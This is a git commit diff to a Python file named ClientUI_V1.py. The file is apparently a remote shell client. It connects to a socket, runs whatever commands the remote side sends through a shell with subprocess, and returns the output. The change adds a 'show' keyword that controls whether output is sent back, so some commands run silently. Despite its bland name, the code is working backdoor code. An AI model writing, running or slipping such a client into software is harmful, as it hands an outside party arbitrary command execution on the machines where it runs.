8b2caaca0349759035bf6ac27b49e3cb651117b2
σ`∀´)σ <hitdoomed@gmail.com>
2020-12-30 11:17:48 +0800

    Update ClientUI_V1.py

--- ClientUI_V1.py
+++ ClientUI_V1.py
@@ -10,17 +10,21 @@ s.connect(ip_port)
 
 while True:
     re = s.recv(2048).decode()
+    re_s = re.split(' ')
     if re =='echo [+] Command Send Done! && exit':
         s.close()
         break
     elif re != '':
-        a = (subprocess.Popen(re,shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,close_fds=True))
-        a.wait()
-        b = a.stdout.read()
-        if(b.decode('utf-8','ignore') == ''):
-            s.send(("no cammand").encode("big5"))
-        s.send(b)
+        if re_s[6] == 'show':
+            re2 = re.split(' ')
+            del re2[6]
+            data2 = ' '.join(re2)
+            a = (subprocess.Popen(data2,shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,close_fds=True))
+            a.wait()
+            b = a.stdout.read()
+            s.send(b)
+        else:
+            a = (subprocess.Popen(re,shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,close_fds=True))
+            a.wait()
 
 s.close()
-
-
